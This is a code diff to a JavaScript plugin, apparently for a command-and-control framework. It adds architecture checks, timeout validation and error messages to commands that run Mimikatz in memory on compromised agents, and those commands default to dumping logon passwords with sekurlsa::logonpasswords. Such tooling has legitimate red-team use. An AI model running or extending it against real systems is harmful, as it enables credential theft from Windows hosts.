@@ -1,9 +1,15 @@
 function mimikatz_arch(id) {
+    if (!ax.is64(id)) {
+        throw new Error("Mimikatz via No-Consolation requires a 64-bit agent; the current agent is 32-bit/WoW64.");
+    }
     let arch = ax.arch(id);
-    if (arch === "x32") {
+    if (arch === "x32" || arch === "x86") {
         return "x86";
     }
-    return arch;
+    if (arch === "x64") {
+        return "x64";
+    }
+    throw new Error("Unsupported agent architecture for Mimikatz: " + arch);
 }
 
 function mimikatz_first_existing(paths) {
@@ -39,7 +45,10 @@ function mimikatz_bof_path(id) {
             }
         }
     }
-    return bases[0] + arch + ".o";
+    throw new Error(
+        "No-Consolation loader for " + arch + " is missing. Build it with " +
+        "make -C Extension-Kit/Execution-BOF, then reload the Creds-BOF AxScript."
+    );
 }
 
 function mimikatz_ensure_exit(modules) {
@@ -47,6 +56,14 @@ function mimikatz_ensure_exit(modules) {
         return modules;
     }
     return modules.replace(/\s+$/, "") + " exit";
+}
+
+function mimikatz_timeout(value) {
+    let timeout = Number(value);
+    if (!isFinite(timeout) || timeout % 1 !== 0 || timeout < 0 || timeout > 900) {
+        throw new Error("--timeout must be an integer from 0 to 900 seconds (0 disables the wait).");
+    }
+    return timeout;
 }
 
 function mimikatz_cred_hook() {
@@ -117,7 +134,7 @@ function mimikatz_from_modules(id, cmdline, modules, timeout, dont_save, headers
     if (!pebytes) {
         let pe_path = mimikatz_pe_path(id);
         if (!pe_path) {
-            throw new Error("mimikatz." + mimikatz_arch(id) + ".exe not found. On the teamserver run: bash Extension-Kit/Creds-BOF/mimikatz/fetch_mimikatz.sh");
+            throw new Error("mimikatz." + mimikatz_arch(id) + ".exe not found. On the teamserver run: bash Extension-Kit/Creds-BOF/mimikatz/fetch_mimikatz.sh, then reload the Creds-BOF AxScript.");
         }
         pebytes = ax.file_read(pe_path);
     }
@@ -126,7 +143,7 @@ function mimikatz_from_modules(id, cmdline, modules, timeout, dont_save, headers
 
 function mimikatz_execute(id, cmdline, pebytes, modules, timeout, dont_save, headers) {
     if (!pebytes || pebytes.length === 0) {
-        throw new Error("mimikatz PE is empty. Run Creds-BOF/mimikatz/fetch_mimikatz.sh on the teamserver, then reload axscripts.");
+        throw new Error("Mimikatz PE could not be read. Run Creds-BOF/mimikatz/fetch_mimikatz.sh on the teamserver and ensure the Creds-BOF directory is in the AxScript sandbox roots.");
     }
 
     let bof_path = mimikatz_bof_path(id);
@@ -155,7 +172,7 @@ var cmd_mimikatz = ax.create_command(
     "Run official Mimikatz in-memory (all modules: sekurlsa, lsadump, kerberos, vault, dpapi, token, privilege, crypto, ...)",
     "mimikatz privilege::debug sekurlsa::logonpasswords exit"
 );
-cmd_mimikatz.addArgFlagInt("--timeout", "timeout", false, "Seconds to wait for Mimikatz (default 120)");
+cmd_mimikatz.addArgFlagInt("--timeout", "timeout", false, "Seconds to wait for Mimikatz (default 120; 0 disables the wait)");
 cmd_mimikatz.addArgFlagFile("-f", "BINARY", false, "Custom Mimikatz PE instead of the fetched official build");
 cmd_mimikatz.addArgBool("--no-exit", "Do not append the Mimikatz exit command");
 cmd_mimikatz.addArgBool("--dont-save", "Do not keep the PE cached in agent memory");
@@ -169,7 +186,7 @@ cmd_mimikatz.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
     let timeout = 120;
     if ("timeout" in parsed_json) {
-        timeout = parsed_json["timeout"];
+        timeout = mimikatz_timeout(parsed_json["timeout"]);
     }
 
     let pebytes = "";
@@ -188,11 +205,11 @@ var cmd_mimikatz_small = ax.create_command(
     "CS-style bmimikatz_small: in-memory Mimikatz, default sekurlsa::logonpasswords",
     "mimikatz_small"
 );
-cmd_mimikatz_small.addArgFlagInt("--timeout", "timeout", false, "Seconds to wait (default 120)");
+cmd_mimikatz_small.addArgFlagInt("--timeout", "timeout", false, "Seconds to wait (default 120; 0 disables the wait)");
 cmd_mimikatz_small.addArgString("modules", false, "Mimikatz modules. Default: privilege::debug sekurlsa::logonpasswords");
 cmd_mimikatz_small.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let modules = mimikatz_ensure_exit(parsed_json["modules"] || "privilege::debug sekurlsa::logonpasswords");
-    let timeout = ("timeout" in parsed_json) ? parsed_json["timeout"] : 120;
+    let timeout = ("timeout" in parsed_json) ? mimikatz_timeout(parsed_json["timeout"]) : 120;
     mimikatz_from_modules(id, cmdline, modules, timeout, 0, 0, "");
 });
 
